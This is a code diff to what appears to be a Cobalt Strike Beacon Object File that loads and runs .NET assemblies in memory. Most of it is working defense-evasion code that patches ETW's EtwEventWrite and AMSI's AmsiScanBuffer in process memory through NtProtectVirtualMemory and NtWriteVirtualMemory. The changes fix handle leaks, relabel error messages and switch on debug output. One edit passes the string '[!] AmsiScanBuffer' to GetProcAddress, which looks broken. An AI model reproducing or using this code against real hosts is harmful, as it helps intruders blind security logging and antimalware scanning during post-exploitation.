@@ -33,10 +33,14 @@ BOOL ReadSlot(char* output, HANDLE* mailHandle)
 	LPSTR lpszBuffer = NULL;
 	size_t size = 65535;
 	char* achID = (char*)intAlloc(size);
+	if (NULL == achID)
+		return FALSE;
 	memset(achID, 0, size);
 	DWORD cAllMessages = 0;
 	HANDLE hEvent;
 	OVERLAPPED ov;
+
+	_CloseHandle CloseHandle = (_CloseHandle) GetProcAddress(GetModuleHandleA("kernel32.dll"), "CloseHandle");
 
 	hEvent = KERNEL32$CreateEventA(NULL, FALSE, FALSE, NULL);
 	if (NULL == hEvent)
@@ -53,11 +57,13 @@ BOOL ReadSlot(char* output, HANDLE* mailHandle)
 
 	if (!fResult)
 	{
+		CloseHandle (hEvent);
 		return FALSE;
 	}
 
 	if (cbMessage == MAILSLOT_NO_MESSAGE)
 	{
+		CloseHandle (hEvent);
 		return TRUE;
 	}
 	
@@ -68,7 +74,10 @@ BOOL ReadSlot(char* output, HANDLE* mailHandle)
 		//Allocate memory for the message. 
 		lpszBuffer = (LPSTR)KERNEL32$GlobalAlloc(GPTR, KERNEL32$lstrlenA((LPSTR)achID) * sizeof(CHAR) + cbMessage);
 		if (NULL == lpszBuffer)
+		{
+			CloseHandle (hEvent);
 			return FALSE;
+		}
 		lpszBuffer[0] = '\0';
 
 		fResult = KERNEL32$ReadFile(*mailHandle,
@@ -80,6 +89,7 @@ BOOL ReadSlot(char* output, HANDLE* mailHandle)
 		if (!fResult)
 		{
 			KERNEL32$GlobalFree((HGLOBAL)lpszBuffer);
+			CloseHandle (hEvent);
 			return FALSE;
 		}
 
@@ -94,6 +104,8 @@ BOOL ReadSlot(char* output, HANDLE* mailHandle)
 
 		if (!fResult)
 		{
+			KERNEL32$GlobalFree((HGLOBAL)lpszBuffer);
+			CloseHandle (hEvent);
 			return FALSE;
 		}
 		
@@ -101,7 +113,6 @@ BOOL ReadSlot(char* output, HANDLE* mailHandle)
 	
 	cbMessage = 0;
 	KERNEL32$GlobalFree((HGLOBAL)lpszBuffer);
-	_CloseHandle CloseHandle = (_CloseHandle) GetProcAddress(GetModuleHandleA("kernel32.dll"), "CloseHandle");
 	CloseHandle(hEvent);
 	return TRUE;
 }
@@ -171,7 +182,7 @@ BOOL patchETW(BOOL revertETW)
 	void* pAddress = (PVOID) GetProcAddress(GetModuleHandleA("ntdll.dll"), "EtwEventWrite");
 	if(pAddress == NULL)
 	{
-		BeaconPrintf(CALLBACK_ERROR , "Getting pointer to EtwEventWrite failed\n");
+		BeaconPrintf(CALLBACK_ERROR , "[!] Getting pointer to EtwEventWrite failed\n");
 		return 0;
 	}	
 	
@@ -182,7 +193,7 @@ BOOL patchETW(BOOL revertETW)
 	_NtProtectVirtualMemory NtProtectVirtualMemory = (_NtProtectVirtualMemory) GetProcAddress(GetModuleHandleA("ntdll.dll"), "NtProtectVirtualMemory");
 	NTSTATUS status = NtProtectVirtualMemory(NtCurrentProcess(), (PVOID)&lpBaseAddress, (PULONG)&uSize, PAGE_EXECUTE_READWRITE, &OldProtection);
 	if (status != STATUS_SUCCESS) {
-		BeaconPrintf(CALLBACK_ERROR , "[-] NtProtectVirtualMemory failed %d\n", status);
+		BeaconPrintf(CALLBACK_ERROR , "[!] NtProtectVirtualMemory failed %d\n", status);
 		return 0;
 	}
 
@@ -190,14 +201,14 @@ BOOL patchETW(BOOL revertETW)
 	_NtWriteVirtualMemory NtWriteVirtualMemory = (_NtWriteVirtualMemory) GetProcAddress(GetModuleHandleA("ntdll.dll"), "NtWriteVirtualMemory");
 	status = NtWriteVirtualMemory(NtCurrentProcess(), pAddress, (PVOID)etwPatch, sizeof(etwPatch)/sizeof(etwPatch[0]), NULL);
 	if (status != STATUS_SUCCESS) {
-		BeaconPrintf(CALLBACK_ERROR , "[-] NtWriteVirtualMemory failed\n");
+		BeaconPrintf(CALLBACK_ERROR , "[!] NtWriteVirtualMemory failed\n");
 		return 0;
 	}
 
 	//Revert back memory protection via NTProtectVirtualMemory
 	status = NtProtectVirtualMemory(NtCurrentProcess(), (PVOID)&lpBaseAddress, (PULONG)&uSize, OldProtection, &NewProtection);
 	if (status != STATUS_SUCCESS) {
-		BeaconPrintf(CALLBACK_ERROR , "[-] NtProtectVirtualMemory2 failed\n");
+		BeaconPrintf(CALLBACK_ERROR , "[!] NtProtectVirtualMemory2 failed\n");
 		return 0;
 	}
 
@@ -217,10 +228,10 @@ BOOL patchAMSI()
 #endif
 
 	HINSTANCE hinst = LoadLibrary("amsi.dll");
-    void* pAddress = (PVOID)GetProcAddress(hinst, "AmsiScanBuffer");
+    void* pAddress = (PVOID)GetProcAddress(hinst, "[!] AmsiScanBuffer");
 	if(pAddress == NULL)
 	{
-		BeaconPrintf(CALLBACK_ERROR , "AmsiScanBuffer failed\n");
+		BeaconPrintf(CALLBACK_ERROR , "[!] AmsiScanBuffer failed\n");
 		return 0;
 	}
 	
@@ -232,7 +243,7 @@ BOOL patchAMSI()
 	_NtProtectVirtualMemory NtProtectVirtualMemory = (_NtProtectVirtualMemory) GetProcAddress(GetModuleHandleA("ntdll.dll"), "NtProtectVirtualMemory");
 	NTSTATUS status = NtProtectVirtualMemory(NtCurrentProcess(), (PVOID)&lpBaseAddress, (PULONG)&uSize, PAGE_EXECUTE_READWRITE, &OldProtection);
 	if (status != STATUS_SUCCESS) {
-		BeaconPrintf(CALLBACK_ERROR , "[-] NtProtectVirtualMemory failed %d\n", status);
+		BeaconPrintf(CALLBACK_ERROR , "[!] NtProtectVirtualMemory failed %d\n", status);
 		return 0;
 	}
 
@@ -240,14 +251,14 @@ BOOL patchAMSI()
 	_NtWriteVirtualMemory NtWriteVirtualMemory = (_NtWriteVirtualMemory) GetProcAddress(GetModuleHandleA("ntdll.dll"), "NtWriteVirtualMemory");
 	status = NtWriteVirtualMemory(NtCurrentProcess(), pAddress, (PVOID)amsiPatch, sizeof(amsiPatch), NULL);
 	if (status != STATUS_SUCCESS) {
-		BeaconPrintf(CALLBACK_ERROR , "[-] NtWriteVirtualMemory failed\n");
+		BeaconPrintf(CALLBACK_ERROR , "[!] NtWriteVirtualMemory failed\n");
 		return 0;
 	}
 
 	//Revert back memory protection via NTProtectVirtualMemory
 	status = NtProtectVirtualMemory(NtCurrentProcess(), (PVOID)&lpBaseAddress, (PULONG)&uSize, OldProtection, &NewProtection);
 	if (status != STATUS_SUCCESS) {
-		BeaconPrintf(CALLBACK_ERROR , "[-] NtProtectVirtualMemory2 failed\n");
+		BeaconPrintf(CALLBACK_ERROR , "[!] NtProtectVirtualMemory2 failed\n");
 		return 0;
 	}
 	
@@ -286,28 +297,28 @@ static BOOL StartCLR(LPCWSTR dotNetVersion, ICLRMetaHost * *ppClrMetaHost, ICLRR
 				else
 				{
 				//If CLR fails to load fail gracefully
-				BeaconPrintf(CALLBACK_ERROR , "[-] Process refusing to get interface of %ls CLR version.  Try running an assembly that requires a differnt CLR version.\n", dotNetVersion);
+				BeaconPrintf(CALLBACK_ERROR , "[!] Process refusing to get interface of %ls CLR version.  Try running an assembly that requires a differnt CLR version.\n", dotNetVersion);
 				return 0;
 				}
 			}
 			else
 			{
 				//If CLR fails to load fail gracefully
-				BeaconPrintf(CALLBACK_ERROR , "[-] Process refusing to load %ls CLR version.  Try running an assembly that requires a differnt CLR version.\n", dotNetVersion);
+				BeaconPrintf(CALLBACK_ERROR , "[!] Process refusing to load %ls CLR version.  Try running an assembly that requires a differnt CLR version.\n", dotNetVersion);
 				return 0;
 			}
 		}
 		else
 		{
 			//If CLR fails to load fail gracefully
-			BeaconPrintf(CALLBACK_ERROR , "[-] Process refusing to get runtime of %ls CLR version.  Try running an assembly that requires a differnt CLR version.\n", dotNetVersion);
+			BeaconPrintf(CALLBACK_ERROR , "[!] Process refusing to get runtime of %ls CLR version.  Try running an assembly that requires a differnt CLR version.\n", dotNetVersion);
 			return 0;
 		}
 	}
 	else
 	{
 		//If CLR fails to load fail gracefully
-		BeaconPrintf(CALLBACK_ERROR , "[-] Process refusing to create %ls CLR version.  Try running an assembly that requires a differnt CLR version.\n", dotNetVersion);
+		BeaconPrintf(CALLBACK_ERROR , "[!] Process refusing to create %ls CLR version.  Try running an assembly that requires a differnt CLR version.\n", dotNetVersion);
 		return 0;
 	}
 
@@ -382,8 +393,8 @@ void go(char* args, int length) {//Executes .NET assembly in memory
 	int argumentCount = 0;
 	HANDLE stdOutput;
 	HANDLE stdError;
-	HANDLE mainHandle;
-	HANDLE hFile;
+	HANDLE mainHandle = INVALID_HANDLE_VALUE;
+	HANDLE hFile      = INVALID_HANDLE_VALUE;
 	size_t wideSize = 0;
 	size_t wideSize2 = 0;
 	BOOL success = 1;
@@ -391,7 +402,8 @@ void go(char* args, int length) {//Executes .NET assembly in memory
 	char* returnData = (char*)intAlloc(size);
 	memset(returnData, 0, size);
 	
-	/*Debug Only
+	/*Debug*/
+	BeaconPrintf(CALLBACK_OUTPUT, "[+] DEBUG INFO:\n");//Debug Only
 	BeaconPrintf(CALLBACK_OUTPUT, "[+] appdomain = %s\n", appDomain);//Debug Only
 	BeaconPrintf(CALLBACK_OUTPUT, "[+] amsi = %d\n", amsi);//Debug Only
 	BeaconPrintf(CALLBACK_OUTPUT, "[+] etw = %d\n", etw);//Debug Only
@@ -404,7 +416,7 @@ void go(char* args, int length) {//Executes .NET assembly in memory
 	BeaconPrintf(CALLBACK_OUTPUT, "[+] mailslot Path name = %s\n", slotPath);//Debug Only
 	BeaconPrintf(CALLBACK_OUTPUT, "[+] assemblyArguments = %s\n", assemblyArguments);//Debug Only
 	BeaconPrintf(CALLBACK_OUTPUT, "[+] assemblyByteLen = %d\n", assemblyByteLen);//Debug Only
-	*/
+	
 	
 	//Determine .NET assemblie version
 	if(FindVersion((void*)assemblyBytes, assemblyByteLen))
@@ -448,7 +460,7 @@ void go(char* args, int length) {//Executes .NET assembly in memory
 		if (success != 1) {
 		
 			//If patching ETW fails exit gracefully
-			BeaconPrintf(CALLBACK_ERROR , "Patching ETW failed.  Try running without patching ETW");
+			BeaconPrintf(CALLBACK_ERROR , "[!] Patching ETW failed.  Try running without patching ETW");
 			return;
 		}
 	}
@@ -517,7 +529,7 @@ void go(char* args, int length) {//Executes .NET assembly in memory
 		
 		//If patching AMSI fails exit gracefully
 		if (success != 1) {
-			BeaconPrintf(CALLBACK_ERROR, "Patching AMSI failed.  Try running without patching AMSI and using obfuscation");
+			BeaconPrintf(CALLBACK_ERROR, "[!] Patching AMSI failed.  Try running without patching AMSI and using obfuscation");
 			return;
 		}
 	}
@@ -538,13 +550,13 @@ void go(char* args, int length) {//Executes .NET assembly in memory
 	hr = pAppDomain->lpVtbl->Load_3(pAppDomain, pSafeArray, &pAssembly);
 	if (hr != S_OK) {
 		//If AppDomain fails to load fail gracefully
-		BeaconPrintf(CALLBACK_ERROR , "[-] Process refusing to load AppDomain of %ls CLR version.  Try running an assembly that requires a differnt CLR version.\n", wNetVersion);
+		BeaconPrintf(CALLBACK_ERROR , "[!] Process refusing to load AppDomain of %ls CLR version.  Try running an assembly that requires a differnt CLR version.\n", wNetVersion);
 		return;	
 	}
 	hr = pAssembly->lpVtbl->EntryPoint(pAssembly, &pMethodInfo);
 	if (hr != S_OK) {
 		//If EntryPoint fails to load fail gracefully
-		BeaconPrintf(CALLBACK_ERROR , "[-] Process refusing to find entry point of assembly.\n");
+		BeaconPrintf(CALLBACK_ERROR , "[!] Process refusing to find entry point of assembly.\n");
 		return;	
 	}
 
@@ -580,8 +592,10 @@ void go(char* args, int length) {//Executes .NET assembly in memory
 
 	//Close handles
 	_CloseHandle CloseHandle = (_CloseHandle) GetProcAddress(GetModuleHandleA("kernel32.dll"), "CloseHandle");
-	CloseHandle(mainHandle);
-	CloseHandle(hFile);
+	if (INVALID_HANDLE_VALUE != mainHandle)
+		CloseHandle(mainHandle);
+	if (INVALID_HANDLE_VALUE != hFile)
+		CloseHandle(hFile);
 	
 	//Revert stdout back to original handles
 	success = SetStdHandle(((DWORD)-11), stdOutput);
@@ -644,7 +658,7 @@ void go(char* args, int length) {//Executes .NET assembly in memory
 
 		if (success != 1) {
 		
-			BeaconPrintf(CALLBACK_ERROR , "Reverting ETW back failed");		
+			BeaconPrintf(CALLBACK_ERROR , "[-] Reverting ETW back failed");		
 		}		
 	}
 	
